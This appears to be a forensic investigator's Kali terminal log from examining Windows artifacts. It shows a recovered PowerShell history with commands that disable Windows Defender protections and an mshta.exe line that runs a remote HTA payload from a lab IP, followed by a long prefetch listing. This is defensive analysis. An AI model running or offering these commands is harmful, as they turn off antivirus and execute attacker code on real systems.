


┌──(root㉿kali)-[/opt]
└─# git clone https://github.com/dkovar/analyzeMFT
Cloning into 'analyzeMFT'...
remote: Enumerating objects: 2241, done.
remote: Counting objects: 100% (389/389), done.
remote: Compressing objects: 100% (133/133), done.
remote: Total 2241 (delta 289), reused 296 (delta 253), pack-reused 1852 (from 3)
Receiving objects: 100% (2241/2241), 1.93 MiB | 8.77 MiB/s, done.
Resolving deltas: 100% (1334/1334), done.


```
┌──(fixit42㉿kali)-[~/…/Microsoft/Windows/PowerShell/PSReadline]
└─$ cat ConsoleHost_history.txt 
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
mshta.exe http://192.168.56.106:8080/1oTEe1jjDf.hta
```

```
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -laR * | grep exe
drwxrwxr-x  2 fixit42 fixit42 4096 Nov 25 12:28 AppCrash_dwm.exe_3da94835167487cec878c8d167d91ee4f35ec10_41746857_cab_17f38c62
drwxrwxr-x  2 fixit42 fixit42 4096 Nov 25 12:28 AppCrash_dwm.exe_ab70d4f6424568ec6cccf22ed535b275030334d_41746857_cab_091237c2
ProgramData/Microsoft/Windows/WER/ReportQueue/AppCrash_dwm.exe_3da94835167487cec878c8d167d91ee4f35ec10_41746857_cab_17f38c62:
ProgramData/Microsoft/Windows/WER/ReportQueue/AppCrash_dwm.exe_ab70d4f6424568ec6cccf22ed535b275030334d_41746857_cab_091237c2:
-rw-rw-r-- 1 fixit42 fixit42  875 Mar 19  2019 choco.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3143 Nov 24 11:53 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 5714 Nov 24 11:28 PowerShell_ISE.exe.log
-rw-rw-r-- 1 fixit42 fixit42  517 Nov 24 13:28 NGenTask.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1692576 Nov 24 11:08 MicrosoftEdgeSetup[1].exe
drwxrwxr-x 2 fixit42 fixit42 4096 Nov 25 12:29 Indexed DB
Users/IEUser/AppData/Local/Packages/Microsoft.MicrosoftEdge_8wekyb3d8bbwe/AppData/User/Default/Indexed DB:
-rw-rw-r-- 1 fixit42 fixit42 2621440 Nov 24 12:03 IndexedDB.edb
-rw-rw-r-- 1 fixit42 fixit42   16384 Nov 24 11:22 IndexedDB.jfm
-rw-rw-r-- 1 fixit42 fixit42 2909 Nov 24 13:21 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 5664 Nov 24 13:28 sdiagnhost.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1837 Nov 24 13:42 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3000 Nov 24 14:25 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1829 Nov 24 14:19 AgentPackageADRemote.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1823 Nov 24 14:19 AgentPackageAgentInformation.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1674 Nov 24 14:19 AgentPackageHeartbeat.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1743 Nov 24 14:19 AgentPackageInternalPoller.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1812 Nov 24 14:19 AgentPackageMarketplace.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3339 Nov 24 14:20 AgentPackageMonitoring.exe.log
-rw-rw-r-- 1 fixit42 fixit42 2329 Nov 24 14:28 AgentPackageOsUpdates.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1812 Nov 24 14:22 AgentPackageRuntimeInstaller.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1606 Nov 24 14:20 AgentPackageSTRemote.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1269 Nov 24 14:19 AgentPackageSystemTools.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1378 Nov 24 14:21 AgentPackageTicketing.exe.log
-rw-rw-r-- 1 fixit42 fixit42  517 Nov 24 10:59 NGenTask.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3824 Nov 24 13:56 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42  651 Nov 24 14:17 rundll32.exe.log
-rw-rw-r-- 1 fixit42 fixit42  226 Nov 24 10:59 taskhostw.exe.log
-rw-rw-r-- 1 fixit42 fixit42  847 Nov 24 12:23 tzsync.exe.log
-rw-rw-r--  1 fixit42 fixit42 2756 Mar 19  2019 IndexerAutomaticMaintenance
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ cd Windows     
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Windows]
└─$ ls -la              
total 44
drwxrwxr-x  8 fixit42 fixit42  4096 Nov 25 12:29 .
drwxrwxr-x  7 fixit42 fixit42  4096 Dec  6 00:55 ..
drwxrwxr-x  3 fixit42 fixit42  4096 Nov 25 12:29 AppCompat
drwxrwxr-x  2 fixit42 fixit42  4096 Nov 25 12:29 inf
drwxrwxr-x  2 fixit42 fixit42 16384 Nov 25 12:29 prefetch
drwxrwxr-x  4 fixit42 fixit42  4096 Nov 25 12:29 ServiceProfiles
drwxrwxr-x 10 fixit42 fixit42  4096 Nov 25 12:29 System32
drwxrwxr-x  2 fixit42 fixit42  4096 Nov 25 12:29 Temp
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Windows]
└─$ cd prefetch     
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Windows/prefetch]
└─$ ls -la
total 3668
drwxrwxr-x 2 fixit42 fixit42 16384 Nov 25 12:29 .
drwxrwxr-x 8 fixit42 fixit42  4096 Nov 25 12:29 ..
-rw-rw-r-- 1 fixit42 fixit42  6142 Nov 24 14:25 7Z2501-X64.EXE-36B52C5B.pf
-rw-rw-r-- 1 fixit42 fixit42  9007 Nov 24 14:25 7ZFM.EXE-7C92DCA0.pf
-rw-rw-r-- 1 fixit42 fixit42 12583 Nov 24 14:21 8-0-11.EXE-3017F841.pf
-rw-rw-r-- 1 fixit42 fixit42 25489 Nov 24 14:21 8-0-11.EXE-5062E074.pf
-rw-rw-r-- 1 fixit42 fixit42 11548 Nov 24 14:22 8-0-11.EXE-8356CA5C.pf
-rw-rw-r-- 1 fixit42 fixit42  8625 Nov 24 14:22 8-0-11.EXE-DA9D95D2.pf
-rw-rw-r-- 1 fixit42 fixit42 21946 Nov 24 14:20 AGENTPACKAGEADREMOTE.EXE-1E10CE75.pf
-rw-rw-r-- 1 fixit42 fixit42 17638 Nov 24 14:32 AGENTPACKAGEAGENTINFORMATION.-E39A050D.pf
-rw-rw-r-- 1 fixit42 fixit42 21129 Nov 24 14:23 AGENTPACKAGEHEARTBEAT.EXE-022FA0BB.pf
-rw-rw-r-- 1 fixit42 fixit42 17129 Nov 24 14:36 AGENTPACKAGEINTERNALPOLLER.EX-D51AC799.pf
-rw-rw-r-- 1 fixit42 fixit42 19299 Nov 24 14:20 AGENTPACKAGEMARKETPLACE.EXE-F44813D5.pf
-rw-rw-r-- 1 fixit42 fixit42 32976 Nov 24 14:30 AGENTPACKAGEMONITORING.EXE-CDAD70DF.pf
-rw-rw-r-- 1 fixit42 fixit42 21695 Nov 24 14:19 AGENTPACKAGEOSUPDATES.EXE-00B0FA5B.pf
-rw-rw-r-- 1 fixit42 fixit42 20131 Nov 24 14:20 AGENTPACKAGERUNTIMEINSTALLER.-950AFFE7.pf
-rw-rw-r-- 1 fixit42 fixit42 11872 Nov 24 14:35 AGENTPACKAGESTREMOTE.EXE-F202DF99.pf
-rw-rw-r-- 1 fixit42 fixit42 17094 Nov 24 14:29 AGENTPACKAGETICKETING.EXE-E1EE6C4F.pf
-rw-rw-r-- 1 fixit42 fixit42  2319 Nov 24 13:10 AM_DELTA_PATCH_1.441.454.0.EX-CE50B309.pf
-rw-rw-r-- 1 fixit42 fixit42 14291 Nov 24 14:09 APPLICATIONFRAMEHOST.EXE-0CF44CC4.pf
-rw-rw-r-- 1 fixit42 fixit42  4128 Nov 24 14:27 ATBROKER.EXE-FF58B71D.pf
-rw-rw-r-- 1 fixit42 fixit42 20774 Nov 24 14:30 ATERAAGENT.EXE-7C5A7FDE.pf
-rw-rw-r-- 1 fixit42 fixit42  7503 Nov 24 14:24 AUDIODG.EXE-D0D776AC.pf
-rw-rw-r-- 1 fixit42 fixit42  9547 Nov 24 14:19 BACKGROUNDTASKHOST.EXE-3C272126.pf
-rw-rw-r-- 1 fixit42 fixit42 28697 Nov 24 14:25 BACKGROUNDTASKHOST.EXE-4F12152B.pf
-rw-rw-r-- 1 fixit42 fixit42  8766 Nov 24 14:09 BACKGROUNDTASKHOST.EXE-5E260887.pf
-rw-rw-r-- 1 fixit42 fixit42  8147 Nov 24 14:30 BACKGROUNDTASKHOST.EXE-60EA8D5D.pf
-rw-rw-r-- 1 fixit42 fixit42 15336 Nov 24 14:10 BACKGROUNDTASKHOST.EXE-6867584F.pf
-rw-rw-r-- 1 fixit42 fixit42  6838 Nov 24 14:27 BACKGROUNDTASKHOST.EXE-7CD59701.pf
-rw-rw-r-- 1 fixit42 fixit42 12250 Nov 24 14:09 BACKGROUNDTASKHOST.EXE-957776C4.pf
-rw-rw-r-- 1 fixit42 fixit42  7094 Nov 24 14:25 BACKGROUNDTASKHOST.EXE-F30DA8E2.pf
-rw-rw-r-- 1 fixit42 fixit42  9110 Nov 24 14:37 BACKGROUNDTRANSFERHOST.EXE-1BA4B810.pf
-rw-rw-r-- 1 fixit42 fixit42  4456 Nov 24 14:37 BDEPSDK.EXE-DA34C8A0.pf
-rw-rw-r-- 1 fixit42 fixit42 20504 Nov 24 14:09 BGINFO.EXE-7A859B68.pf
-rw-rw-r-- 1 fixit42 fixit42  7180 Nov 24 14:09 BROWSER_BROKER.EXE-DDA21E2B.pf
-rw-rw-r-- 1 fixit42 fixit42  6914 Nov 24 13:00 BYTECODEGENERATOR.EXE-883FEF79.pf
-rw-rw-r-- 1 fixit42 fixit42  4477 Nov 24 14:36 CMD.EXE-89305D47.pf
-rw-rw-r-- 1 fixit42 fixit42  3095 Nov 24 14:36 CMD.EXE-EABFE48B.pf
-rw-rw-r-- 1 fixit42 fixit42  2763 Nov 24 14:25 COMPATTELRUNNER.EXE-FF885652.pf
-rw-rw-r-- 1 fixit42 fixit42  9770 Nov 24 14:17 CONHOST.EXE-3218E401.pf
-rw-rw-r-- 1 fixit42 fixit42 41758 Nov 24 14:32 CONSENT.EXE-65F6206D.pf
-rw-rw-r-- 1 fixit42 fixit42  9077 Nov 24 14:03 CONTROL.EXE-9459D5A0.pf
-rw-rw-r-- 1 fixit42 fixit42 10117 Nov 24 14:32 CSC.EXE-17F940BB.pf
-rw-rw-r-- 1 fixit42 fixit42 10584 Nov 24 14:32 CSCRIPT.EXE-E4C98DEB.pf
-rw-rw-r-- 1 fixit42 fixit42  6259 Nov 24 14:08 CSRSS.EXE-8C04D631.pf
-rw-rw-r-- 1 fixit42 fixit42  8822 Nov 24 14:27 CTFMON.EXE-AF4187A6.pf
-rw-rw-r-- 1 fixit42 fixit42  3538 Nov 24 14:16 CURL.EXE-CEB1D6A9.pf
-rw-rw-r-- 1 fixit42 fixit42  3324 Nov 24 14:32 CVTRES.EXE-299AD2C9.pf
-rw-rw-r-- 1 fixit42 fixit42  3402 Nov 24 12:21 DEFRAG.EXE-738093E8.pf
-rw-rw-r-- 1 fixit42 fixit42  4038 Nov 24 14:10 DLLHOST.EXE-0F726681.pf
-rw-rw-r-- 1 fixit42 fixit42 10982 Nov 24 14:10 DLLHOST.EXE-3B8267A2.pf
-rw-rw-r-- 1 fixit42 fixit42  5512 Nov 24 14:27 DLLHOST.EXE-6326BE1D.pf
-rw-rw-r-- 1 fixit42 fixit42  5120 Nov 24 12:16 DLLHOST.EXE-69DC4D68.pf
-rw-rw-r-- 1 fixit42 fixit42  6701 Nov 24 14:37 DLLHOST.EXE-71214090.pf
-rw-rw-r-- 1 fixit42 fixit42  6341 Nov 24 13:00 DLLHOST.EXE-74CFCB84.pf
-rw-rw-r-- 1 fixit42 fixit42  4017 Nov 24 14:30 DLLHOST.EXE-893DDF55.pf
-rw-rw-r-- 1 fixit42 fixit42  5114 Nov 24 13:09 DLLHOST.EXE-C51C8CF2.pf
-rw-rw-r-- 1 fixit42 fixit42  9185 Nov 24 14:12 DLLHOST.EXE-E3B2D152.pf
-rw-rw-r-- 1 fixit42 fixit42  5546 Nov 24 14:09 DLLHOST.EXE-EBC0C559.pf
-rw-rw-r-- 1 fixit42 fixit42  5846 Nov 24 14:03 DLLHOST.EXE-FF915DF9.pf
-rw-rw-r-- 1 fixit42 fixit42  2224 Nov 24 14:22 DOTNET.EXE-5927DE9D.pf
-rw-rw-r-- 1 fixit42 fixit42 28296 Nov 24 14:36 DOTNET.EXE-B94F52B0.pf
-rw-rw-r-- 1 fixit42 fixit42 18501 Nov 24 14:22 DOTNET-RUNTIME-8.0.11-WIN-X64-5064691C.pf
-rw-rw-r-- 1 fixit42 fixit42 17659 Nov 24 14:21 DOTNET-RUNTIME-8.0.11-WIN-X64-BE9614CB.pf
-rw-rw-r-- 1 fixit42 fixit42 18954 Nov 24 14:21 DOTNET-RUNTIME-8.0.11-WIN-X64-E3333FFA.pf
-rw-rw-r-- 1 fixit42 fixit42 18631 Nov 24 14:08 DWM.EXE-AEABE78B.pf
-rw-rw-r-- 1 fixit42 fixit42  5952 Nov 24 14:09 ELEVATION_SERVICE.EXE-287D3712.pf
-rw-rw-r-- 1 fixit42 fixit42  7324 Nov 24 13:18 FILECOAUTH.EXE-0204C4F9.pf
-rw-rw-r-- 1 fixit42 fixit42  7364 Nov 24 13:09 FILECOAUTH.EXE-E5C8F0AA.pf
-rw-rw-r-- 1 fixit42 fixit42  5914 Nov 24 12:48 FILESYNCCONFIG.EXE-C4373FAD.pf
-rw-rw-r-- 1 fixit42 fixit42  6049 Nov 24 12:47 FILESYNCCONFIG.EXE-F637E048.pf
-rw-rw-r-- 1 fixit42 fixit42  3410 Nov 24 14:08 FONTDRVHOST.EXE-E2768E90.pf
-rw-rw-r-- 1 fixit42 fixit42  7452 Nov 24 14:09 FSQUIRT.EXE-CEB3AAF1.pf
-rw-rw-r-- 1 fixit42 fixit42 17174 Nov 24 14:32 GKAPE.EXE-7F8C751D.pf
-rw-rw-r-- 1 fixit42 fixit42  2644 Nov 24 14:12 HOSTNAME.EXE-A62916AE.pf
-rw-rw-r-- 1 fixit42 fixit42 14474 Nov 24 14:25 HXTSR.EXE-60354C1D.pf
-rw-rw-r-- 1 fixit42 fixit42 13104 Nov 24 14:09 IE4UINIT.EXE-0BC11EF2.pf
-rw-rw-r-- 1 fixit42 fixit42  6309 Nov 24 11:53 IEXPLORE.EXE-1B894AFB.pf
-rw-rw-r-- 1 fixit42 fixit42  5503 Nov 24 14:36 _IS2726.EXE-36D636B0.pf
-rw-rw-r-- 1 fixit42 fixit42  5413 Nov 24 14:36 _IS389C.EXE-BDAC499F.pf
-rw-rw-r-- 1 fixit42 fixit42  5709 Nov 24 14:36 _IS6E42.EXE-613E3BA2.pf
-rw-rw-r-- 1 fixit42 fixit42  5528 Nov 24 14:36 _ISA61C.EXE-67521CF5.pf
-rw-rw-r-- 1 fixit42 fixit42  5486 Nov 24 14:36 _ISE1ED.EXE-9AEC63CB.pf
-rw-rw-r-- 1 fixit42 fixit42 36346 Nov 24 14:36 KAPE.EXE-0E83B5E2.pf
-rw-rw-r-- 1 fixit42 fixit42 38495 Nov 24 14:26 LOGONUI.EXE-1BEE4A84.pf
-rw-rw-r-- 1 fixit42 fixit42  9256 Nov 24 13:28 MAKECAB.EXE-21F14B27.pf
-rw-rw-r-- 1 fixit42 fixit42 19073 Nov 24 12:03 MICROSOFTEDGECP.EXE-1FF23A10.pf
-rw-rw-r-- 1 fixit42 fixit42 42128 Nov 24 14:09 MICROSOFTEDGE.EXE-0F2B3493.pf
-rw-rw-r-- 1 fixit42 fixit42  8021 Nov 24 12:03 MICROSOFTEDGESH.EXE-DC6B79BA.pf
-rw-rw-r-- 1 fixit42 fixit42  8153 Nov 24 14:17 MICROSOFTEDGEUPDATE.EXE-0E099B6C.pf
-rw-rw-r-- 1 fixit42 fixit42  7902 Nov 24 14:09 MOBSYNC.EXE-D8BC6ED2.pf
-rw-rw-r-- 1 fixit42 fixit42  5032 Nov 24 12:59 MOFCOMP.EXE-CDA1E783.pf
-rw-rw-r-- 1 fixit42 fixit42  6007 Nov 24 13:10 MPCMDRUN.EXE-E887981E.pf
-rw-rw-r-- 1 fixit42 fixit42  7211 Nov 24 12:59 MPCMDRUN.EXE-FBB0D9B7.pf
-rw-rw-r-- 1 fixit42 fixit42 18039 Nov 24 13:00 MPDEFENDERCORESERVICE.EXE-DB0D7D5C.pf
-rw-rw-r-- 1 fixit42 fixit42  2316 Nov 24 12:59 MPRECOVERY.EXE-FBEA3148.pf
-rw-rw-r-- 1 fixit42 fixit42  4598 Nov 24 12:59 MPSIGSTUB.EXE-48721DEA.pf
-rw-rw-r-- 1 fixit42 fixit42 11731 Nov 24 13:10 MPSIGSTUB.EXE-7C60A359.pf
-rw-rw-r-- 1 fixit42 fixit42 26275 Nov 24 12:29 MSCORSVW.EXE-98F0699A.pf
-rw-rw-r-- 1 fixit42 fixit42 20567 Nov 24 13:28 MSCORSVW.EXE-FAA88858.pf
-rw-rw-r-- 1 fixit42 fixit42 20409 Nov 24 14:09 MSEDGE.EXE-BA103770.pf
-rw-rw-r-- 1 fixit42 fixit42 24700 Nov 24 13:21 MSEDGE.EXE-BA103771.pf
-rw-rw-r-- 1 fixit42 fixit42 14151 Nov 24 13:16 MSEDGE.EXE-BA103772.pf
-rw-rw-r-- 1 fixit42 fixit42 19304 Nov 24 14:09 MSEDGE.EXE-BA103773.pf
-rw-rw-r-- 1 fixit42 fixit42  5121 Nov 24 14:09 MSEDGE.EXE-BA103774.pf
-rw-rw-r-- 1 fixit42 fixit42 20286 Nov 24 13:18 MSEDGE.EXE-BA103778.pf
-rw-rw-r-- 1 fixit42 fixit42 42171 Nov 24 13:43 MSHTA.EXE-F5916AF4.pf
-rw-rw-r-- 1 fixit42 fixit42 16614 Nov 24 14:35 MSIEXEC.EXE-B5AFA339.pf
-rw-rw-r-- 1 fixit42 fixit42 10188 Nov 24 14:36 MSIEXEC.EXE-F3744DFD.pf
-rw-rw-r-- 1 fixit42 fixit42 25986 Nov 24 12:59 MSMPENG.EXE-37397D24.pf
-rw-rw-r-- 1 fixit42 fixit42  7483 Nov 24 12:59 MSMPENG.EXE-727D26E3.pf
-rw-rw-r-- 1 fixit42 fixit42  5223 Nov 24 14:09 MUSNOTIFYICON.EXE-A201B346.pf
-rw-rw-r-- 1 fixit42 fixit42  2789 Nov 24 13:28 NET1.EXE-71327F1F.pf
-rw-rw-r-- 1 fixit42 fixit42  3558 Nov 24 14:16 NET1.EXE-B8A8247B.pf
-rw-rw-r-- 1 fixit42 fixit42  2575 Nov 24 14:16 NET.EXE-1DF3A2F6.pf
-rw-rw-r-- 1 fixit42 fixit42  2750 Nov 24 13:28 NET.EXE-7F832A3A.pf
-rw-rw-r-- 1 fixit42 fixit42 10733 Nov 24 13:28 NGEN.EXE-8DF18334.pf
-rw-rw-r-- 1 fixit42 fixit42 13492 Nov 24 12:22 NGEN.EXE-E9662EB6.pf
-rw-rw-r-- 1 fixit42 fixit42  9034 Nov 24 12:22 NGENTASK.EXE-90AAC3ED.pf
-rw-rw-r-- 1 fixit42 fixit42 13598 Nov 24 13:28 NGENTASK.EXE-F262E2AB.pf
-rw-rw-r-- 1 fixit42 fixit42  6123 Nov 24 13:00 NISSRV.EXE-58838C99.pf
-rw-rw-r-- 1 fixit42 fixit42  5345 Nov 24 12:41 NISSRV.EXE-986C7FC2.pf
-rw-rw-r-- 1 fixit42 fixit42  9200 Nov 24 13:18 NOTEPAD.EXE-EB1B961A.pf
-rw-rw-r-- 1 fixit42 fixit42 38102 Nov 24 12:53 ONEDRIVE.EXE-33D53679.pf
-rw-rw-r-- 1 fixit42 fixit42 53410 Nov 24 12:48 ONEDRIVE.EXE-A4F1B555.pf
-rw-rw-r-- 1 fixit42 fixit42 10010 Nov 24 12:48 ONEDRIVESETUP.EXE-8941D4BD.pf
-rw-rw-r-- 1 fixit42 fixit42 36249 Nov 24 14:09 ONEDRIVESETUP.EXE-DB6B36F0.pf
-rw-rw-r-- 1 fixit42 fixit42 10029 Nov 24 14:37 OSQUERYI.EXE-03338E4C.pf
-rw-rw-r-- 1 fixit42 fixit42  2816 Nov 24 13:18 PING.EXE-B29F6629.pf
-rw-rw-r-- 1 fixit42 fixit42 33215 Nov 24 13:43 POWERSHELL.EXE-3E7086C1.pf
-rw-rw-r-- 1 fixit42 fixit42 67395 Nov 24 14:30 POWERSHELL.EXE-59FC8F3D.pf
-rw-rw-r-- 1 fixit42 fixit42  9970 Nov 24 14:36 PREVERCHECK.EXE-C6783EBF.pf
-rw-rw-r-- 1 fixit42 fixit42 39059 Nov 24 14:12 RUBY.EXE-4684BBC3.pf
-rw-rw-r-- 1 fixit42 fixit42  5175 Nov 24 14:08 RUNDLL32.EXE-01DDC3AD.pf
-rw-rw-r-- 1 fixit42 fixit42 26271 Nov 24 11:53 RUNDLL32.EXE-16C4F8D5.pf
-rw-rw-r-- 1 fixit42 fixit42 17392 Nov 24 14:17 RUNDLL32.EXE-1D6E45D3.pf
-rw-rw-r-- 1 fixit42 fixit42 10747 Nov 24 14:17 RUNDLL32.EXE-5350D2BB.pf
-rw-rw-r-- 1 fixit42 fixit42  3693 Nov 24 13:27 RUNDLL32.EXE-5DD38A69.pf
-rw-rw-r-- 1 fixit42 fixit42 10495 Nov 24 14:17 RUNDLL32.EXE-6127BF0F.pf
-rw-rw-r-- 1 fixit42 fixit42 16327 Nov 24 14:18 RUNDLL32.EXE-7305875A.pf
-rw-rw-r-- 1 fixit42 fixit42  4699 Nov 24 14:28 RUNDLL32.EXE-A051DAB7.pf
-rw-rw-r-- 1 fixit42 fixit42 17701 Nov 24 11:53 RUNDLL32.EXE-B116FB90.pf
-rw-rw-r-- 1 fixit42 fixit42  3346 Nov 24 14:02 RUNDLL32.EXE-C329EEAF.pf
-rw-rw-r-- 1 fixit42 fixit42  6084 Nov 24 14:33 RUNDLL32.EXE-F52D40E6.pf
-rw-rw-r-- 1 fixit42 fixit42  5171 Nov 24 14:35 RUNTIMEBROKER.EXE-2646D14E.pf
-rw-rw-r-- 1 fixit42 fixit42  4510 Nov 24 12:53 RUNTIMEBROKER.EXE-2B48D665.pf
-rw-rw-r-- 1 fixit42 fixit42  9087 Nov 24 14:28 RUNTIMEBROKER.EXE-2CE44F33.pf
-rw-rw-r-- 1 fixit42 fixit42  9013 Nov 24 13:05 RUNTIMEBROKER.EXE-2DC0BE78.pf
-rw-rw-r-- 1 fixit42 fixit42 12201 Nov 24 14:09 RUNTIMEBROKER.EXE-41BF4CB6.pf
-rw-rw-r-- 1 fixit42 fixit42  7324 Nov 24 14:25 RUNTIMEBROKER.EXE-52F0C44F.pf
-rw-rw-r-- 1 fixit42 fixit42 11615 Nov 24 12:48 RUNTIMEBROKER.EXE-54F0EFB7.pf
-rw-rw-r-- 1 fixit42 fixit42  9770 Nov 24 14:09 RUNTIMEBROKER.EXE-698B5688.pf
-rw-rw-r-- 1 fixit42 fixit42  8405 Nov 24 12:49 RUNTIMEBROKER.EXE-6FF9C5BC.pf
-rw-rw-r-- 1 fixit42 fixit42  4648 Nov 24 12:51 RUNTIMEBROKER.EXE-718B89F2.pf
-rw-rw-r-- 1 fixit42 fixit42 13004 Nov 24 14:09 RUNTIMEBROKER.EXE-7E162708.pf
-rw-rw-r-- 1 fixit42 fixit42  4906 Nov 24 12:48 RUNTIMEBROKER.EXE-7EC169D2.pf
-rw-rw-r-- 1 fixit42 fixit42  8828 Nov 24 12:54 RUNTIMEBROKER.EXE-8F6E6AC9.pf
-rw-rw-r-- 1 fixit42 fixit42 10671 Nov 24 14:25 RUNTIMEBROKER.EXE-A02FF048.pf
-rw-rw-r-- 1 fixit42 fixit42 17255 Nov 24 14:20 RUNTIMEBROKER.EXE-B2A4CECC.pf
-rw-rw-r-- 1 fixit42 fixit42  8820 Nov 24 14:33 RUNTIMEBROKER.EXE-C74117BB.pf
-rw-rw-r-- 1 fixit42 fixit42 14679 Nov 24 14:09 RUNTIMEBROKER.EXE-CE3A47EB.pf
-rw-rw-r-- 1 fixit42 fixit42  8341 Nov 24 14:33 RUNTIMEBROKER.EXE-D558B243.pf
-rw-rw-r-- 1 fixit42 fixit42  9768 Nov 24 14:32 RUNTIMEBROKER.EXE-D7683B03.pf
-rw-rw-r-- 1 fixit42 fixit42  8765 Nov 24 13:03 RUNTIMEBROKER.EXE-DA5DED61.pf
-rw-rw-r-- 1 fixit42 fixit42 11422 Nov 24 14:10 RUNTIMEBROKER.EXE-DEE505F5.pf
-rw-rw-r-- 1 fixit42 fixit42 13432 Nov 24 13:28 SDIAGNHOST.EXE-67CD1457.pf
-rw-rw-r-- 1 fixit42 fixit42  3888 Nov 24 14:36 SEARCHFILTERHOST.EXE-AA7A1FDD.pf
-rw-rw-r-- 1 fixit42 fixit42  4351 Nov 24 14:24 SEARCHPROTOCOLHOST.EXE-AFAD3EF9.pf
-rw-rw-r-- 1 fixit42 fixit42 84294 Nov 24 14:09 SEARCHUI.EXE-1D561C47.pf
-rw-rw-r-- 1 fixit42 fixit42 24573 Nov 24 13:09 SECHEALTHUI.EXE-1C98F4D4.pf
-rw-rw-r-- 1 fixit42 fixit42  5692 Nov 24 14:09 SECURITYHEALTHSYSTRAY.EXE-9E333714.pf
-rw-rw-r-- 1 fixit42 fixit42 10888 Nov 24 14:08 SESSIONMSG.EXE-8F843F9A.pf
-rw-rw-r-- 1 fixit42 fixit42  2744 Nov 24 14:09 SETTINGSYNCHOST.EXE-4912ABB0.pf
-rw-rw-r-- 1 fixit42 fixit42  9263 Nov 24 14:08 SETUP.EXE-C17BD34E.pf
-rw-rw-r-- 1 fixit42 fixit42  4451 Nov 24 14:08 SETUP.EXE-C17BD352.pf
-rw-rw-r-- 1 fixit42 fixit42  9750 Nov 24 14:36 SETUPUTIL.EXE-C78B4D0F.pf
-rw-rw-r-- 1 fixit42 fixit42  2500 Nov 24 12:42 SGRMBROKER.EXE-E6FE19A1.pf
-rw-rw-r-- 1 fixit42 fixit42 44019 Nov 24 14:09 SHELLEXPERIENCEHOST.EXE-7F9E3BD5.pf
-rw-rw-r-- 1 fixit42 fixit42 13706 Nov 24 12:53 SIHOST.EXE-473D56F5.pf
-rw-rw-r-- 1 fixit42 fixit42 18051 Nov 24 14:31 SKYPE4LIFE.EXE-EC99DED7.pf
-rw-rw-r-- 1 fixit42 fixit42 13592 Nov 24 14:09 SMARTSCREEN.EXE-4BF07096.pf
-rw-rw-r-- 1 fixit42 fixit42  1833 Nov 24 14:08 SMSS.EXE-1DCD0EB1.pf
-rw-rw-r-- 1 fixit42 fixit42 15235 Nov 24 13:21 SPEECHRUNTIME.EXE-A8F4661E.pf
-rw-rw-r-- 1 fixit42 fixit42 13404 Nov 24 14:35 SPLASHTOPSTREAMER.EXE-602ACF3C.pf
-rw-rw-r-- 1 fixit42 fixit42  6359 Nov 24 14:09 SPPEXTCOMOBJ.EXE-F8C1C601.pf
-rw-rw-r-- 1 fixit42 fixit42  7723 Nov 24 14:36 SPPSVC.EXE-CBE91656.pf
-rw-rw-r-- 1 fixit42 fixit42 10785 Nov 24 14:37 SRAGENT.EXE-7130DEDB.pf
-rw-rw-r-- 1 fixit42 fixit42 10220 Nov 24 14:37 SRAPPPB.EXE-F6D53117.pf
-rw-rw-r-- 1 fixit42 fixit42  8805 Nov 24 14:37 SRFEATURE.EXE-8B06F96C.pf
-rw-rw-r-- 1 fixit42 fixit42 18309 Nov 24 14:37 SRMANAGER.EXE-78B4D557.pf
-rw-rw-r-- 1 fixit42 fixit42  3911 Nov 24 14:36 SRSELFSIGNCERTUTIL.EXE-6B4AB3EB.pf
-rw-rw-r-- 1 fixit42 fixit42  9676 Nov 24 14:37 SRSERVER.EXE-AB791B1B.pf
-rw-rw-r-- 1 fixit42 fixit42  6737 Nov 24 14:37 SRSERVICE.EXE-1C63CEFD.pf
-rw-rw-r-- 1 fixit42 fixit42  6589 Nov 24 14:37 SRUTILITY.EXE-21D5867C.pf
-rw-rw-r-- 1 fixit42 fixit42  9931 Nov 24 14:37 SRVIRTUALDISPLAY.EXE-DEAB1151.pf
-rw-rw-r-- 1 fixit42 fixit42  8300 Nov 24 14:20 SVCHOST.EXE-00ABB06A.pf
-rw-rw-r-- 1 fixit42 fixit42  8842 Nov 24 14:08 SVCHOST.EXE-00BB3EFB.pf
-rw-rw-r-- 1 fixit42 fixit42  7829 Nov 24 14:04 SVCHOST.EXE-00D67198.pf
-rw-rw-r-- 1 fixit42 fixit42  7962 Nov 24 14:20 SVCHOST.EXE-00F6E14D.pf
-rw-rw-r-- 1 fixit42 fixit42  3503 Nov 24 13:47 SVCHOST.EXE-12690405.pf
-rw-rw-r-- 1 fixit42 fixit42  4583 Nov 24 13:52 SVCHOST.EXE-1616013E.pf
-rw-rw-r-- 1 fixit42 fixit42 14906 Nov 24 12:43 SVCHOST.EXE-183BA944.pf
-rw-rw-r-- 1 fixit42 fixit42  6801 Nov 24 14:25 SVCHOST.EXE-1BE53268.pf
-rw-rw-r-- 1 fixit42 fixit42  7751 Nov 24 12:44 SVCHOST.EXE-1E14D699.pf
